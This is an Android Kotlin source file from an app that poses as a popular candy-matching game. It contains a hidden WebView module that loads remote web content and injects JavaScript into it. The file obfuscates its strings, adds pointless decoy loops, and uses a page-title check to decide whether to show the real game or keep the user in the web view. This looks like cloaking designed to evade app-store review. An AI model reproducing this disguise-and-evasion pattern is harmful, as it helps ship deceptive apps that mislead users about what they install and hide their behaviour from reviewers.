package com.king.candycrushsodasa.wBrazil.brazil

import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfStr
import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import android.webkit.*
import androidx.core.content.FileProvider
import com.karumi.dexter.Dexter
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.single.PermissionListener
import com.king.candycrushsodasa.MenuActivity
import com.king.candycrushsodasa.wBrazil.BrazilActivity
import com.king.candycrushsodasa.wBrazil.Full.ValueCallBack
import com.king.candycrushsodasa.wBrazil.Full.callMain
import com.king.candycrushsodasa.wBrazil.Full.voidString
import com.king.candycrushsodasa.wBrazil.sharedPref.Delegat
import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfustringThis
import io.michaelrocks.paranoid.Obfuscate
import java.io.File
import java.io.FileReader
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
@ObfustringThis
@Obfuscate
class JavaScript(context: Context, activity: BrazilActivity, dataDelegat: Delegat) {

    @SuppressLint("SetJavaScriptEnabled")
    fun set(webView: WebView){
        webView.apply {
            CookieManager.getInstance().setAcceptCookie(true)
            CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
            isSaveEnabled = true
            isFocusable = true
            isFocusableInTouchMode = true
            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false
            setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            webViewClient = webViewClientBrazil
            webChromeClient = webChromeClientBrazil
        }
        webView.settings.apply {

            mixedContentMode = 0
            javaScriptEnabled = true
            domStorageEnabled = true
            loadsImagesAutomatically = true
            databaseEnabled = true
            useWideViewPort = true
            allowFileAccess = true
            javaScriptCanOpenWindowsAutomatically = true
            loadWithOverviewMode = true
            allowContentAccess = true
            setSupportMultipleWindows(false)
            builtInZoomControls = true
            displayZoomControls = false
            cacheMode = WebSettings.LOAD_DEFAULT
            //; wv
            //""
            userAgentString = userAgentString.replace(ObfStr("brazil").v("; xm"),ObfStr("brazil").v(""))}
        }
    val webViewClientBrazil = object :WebViewClient(){
        override fun onLoadResource(view: WebView?, url: String?) {
            super.onLoadResource(view, url)
            try {
                activity.gathClient.evaluateJavascript(view)
            }catch (e:Exception){
//@ | Log.e("TAG","onLoadResource: $e")
                Log.e(ObfStr("brazil").v("OLA"),ObfStr("brazil").v("peFnioMvsnccdv: ¦$e¦"))
            }
        }

        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {

            val url = request?.url.toString()
            //https://t.me/joinchat
            if (url.startsWith(ObfStr("brazil").v("iktoa://e.nv/jnqydyas"))) {
                context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
            }


            //gaar
            val zeroCount: ArrayList<Int> = ArrayList()
            val str: String = ObfStr("brazil").v("Ortsq")
            val symbols = str.toCharArray()
            var count = 0
            var result = 0
            for (symbol in symbols) {
                if (symbol - '0' == 0) {
                    count++
                } else {
                    if (count != 0) {
                        zeroCount.add(count)
                    }
                    count = 0
                }
            }
            if (count != 0) {
                zeroCount.add(count)
            }
            if (!zeroCount.isEmpty()) {
                zeroCount.sortWith(Collections.reverseOrder())
                result = zeroCount[0]
            }

            //http://
            //https://
            return if (request?.url == null || url.startsWith(ObfStr("brazil").v("ikto://")) || url.startsWith(
                    ObfStr("brazil").v("iktoa://")
                )
            ) false
            else try {
                //mailto
                if (url.startsWith(ObfStr("brazil").v("nrikbz"))) {
                    context.startActivity(
                        Intent.createChooser(
                            Intent(Intent.ACTION_SEND).apply {
                                //plain/text
                                type = ObfStr("brazil").v("qcahv/efot")
                                putExtra(
                                    Intent.EXTRA_EMAIL,
                                    //mailto:
                                    //""
                                    url.replace(
                                        ObfStr("brazil").v("nrikbz:"),
                                        ObfStr("brazil").v("")
                                    )
                                )
                            },
                            //Mail:
                            ObfStr("brazil").v("Hrik:")
                        )
                    )
                    //tel:
                } else if (url.startsWith(ObfStr("brazil").v("uvl:"))) {
                    context.startActivity(Intent.createChooser(Intent(Intent.ACTION_DIAL).apply {
                        data = Uri.parse(url)
                        //Call:
                    }, ObfStr("brazil").v("Xrlk:")))
                }
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                view?.context?.startActivity(intent)
                true
            } catch (e: java.lang.Exception) {
                true
            }
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            //load2topdogY2022
            if (view?.title?.contains(ObfStr("brazil").v("mfac2bzquofA2022")) == true) {
                activity.startActivity(Intent(activity, MenuActivity::class.java))
                activity.finish()
            } else {
                if (dataDelegat.data.toString() == voidString) {
                    dataDelegat.data = setOf(url.toString())
                }
            }
        }
    }
    val webChromeClientBrazil = object :WebChromeClient(){
        override fun onShowFileChooser(
            webView: WebView?,
            filePathCallback: ValueCallback<Array<Uri>>?,
            fileChooserParams: FileChooserParams?
        ): Boolean {
            Dexter.withContext(context).withPermission(
                Manifest.permission.CAMERA
            ).withListener(object : PermissionListener {

                override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
                    chekPermissions(filePathCallback, cameraGranted = true, context, activity)
                }

                override fun onPermissionDenied(p0: PermissionDeniedResponse?) {
                    chekPermissions(filePathCallback, cameraGranted = false, context, activity)
                }

                override fun onPermissionRationaleShouldBeShown(
                    p0: com.karumi.dexter.listener.PermissionRequest?,
                    p1: PermissionToken?
                ) {
                    p1?.continuePermissionRequest()
                }
            }).check()
            return true
        }
    }
}

private fun next(a: Int, b: Int): Int {
    return a + b
}

    private fun chekPermissions(filePathCallback: ValueCallback<Array<Uri>>?, cameraGranted: Boolean, context: Context, activity: BrazilActivity) {
        ValueCallBack = filePathCallback
        var takePictureIntent: Intent? = null
        if (cameraGranted) {
            takePictureIntent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            var photoFile: File? = null
            try {

                val fib = ArrayList(Arrays.asList(1, 2))
                val result = StringBuilder()

                val symbols = "1FF"
                val symbolsArr = symbols.toCharArray()

                var index = 1
                var next: Int = next(fib[fib.size - 1], fib[fib.size - 2])

                for (symbol in symbolsArr) {
                    val str = symbol.toString()
                    if (index == 1 || index == 2) {
                        result.append(str)
                    } else {
                        if (index == next) {
                            result.append(str)
                            fib.add(index)
                            next = next(fib[fib.size - 1], fib[fib.size - 2])
                        }
                    }
                    index++
                }

                //yyyyMMdd_HHmmss
                val timeStamp: String =
                    SimpleDateFormat(
                        "yyyyMMdd_HHmmss",
                        Locale.getDefault()
                    ).format(
                        Date()
                    )
                //FDI_JS_SS${timeStamp}_GjslUTRGF
                //.jpg
                val imageFileName = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                photoFile = File.createTempFile(
                    "FDI_JS_SS${timeStamp}_GjslUTRGF",
                   ".jpg",
                    imageFileName
                )
                //PhotoPath
                takePictureIntent.putExtra("PhotoPath", callMain)
            } catch (e: IOException) {
            }
            if (photoFile != null) {
                //file:
                callMain = "file:" + photoFile.absolutePath
                val uri = FileProvider.getUriForFile(
                    context,
                    //.provider
                    context.packageName + ".provider",
                    photoFile
                )
                takePictureIntent.apply {
                    putExtra(MediaStore.EXTRA_OUTPUT, uri)
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                }
            } else {
                takePictureIntent = null
            }
        }
        val intentArray: Array<Intent?> =
            takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)

        val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT).apply {
            addCategory(Intent.CATEGORY_OPENABLE)
            //image/*
            type = "image/*"
        }

        Intent(Intent.ACTION_CHOOSER).run {
            putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
            //Image Chooser
            putExtra(Intent.EXTRA_TITLE, "Image Chooser")
            putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
            activity.startActivityForResult(this, 1)
        }
    }